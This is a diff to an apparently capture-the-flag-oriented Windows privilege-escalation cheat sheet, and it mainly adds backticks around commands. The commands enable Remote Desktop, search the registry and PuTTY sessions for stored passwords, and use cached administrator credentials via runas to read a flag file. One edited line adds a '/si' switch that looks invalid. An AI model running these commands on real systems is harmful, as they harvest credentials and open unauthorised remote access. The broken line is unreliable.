@@ -79,9 +79,9 @@ We can enable remote desktop from windows command line by running the following 
 
 reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
 
-netsh firewall set service remoteadmin enable
-netsh firewall set service remotedesktop enable
-net start termservice
+`netsh firewall set service remoteadmin enable`
+`netsh firewall set service remotedesktop enable`
+`net start termservice`
 
 
 reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 
@@ -102,13 +102,13 @@ reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"
 reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
 
 #### Search for password in registry
-reg query HKLM /f password /t REG_SZ /s
-reg query HKCU /f password /t REG_SZ /s
+`reg query HKLM /f password /t REG_SZ /si`
+`reg query HKCU /f password /t REG_SZ /s`
 
 ### runas
-runas /user:DOMAIN\user cmd.exe
+`runas /user:DOMAIN\user cmd.exe`
 
-runas /savecred /user:access\administrator "cmd /c type c:\users\administrator\desktop\root.txt > c:\users\security\y.txt"
+`runas /savecred /user:access\administrator "cmd /c type c:\users\administrator\desktop\root.txt > c:\users\security\y.txt"`
 
 
 #### check files in directories
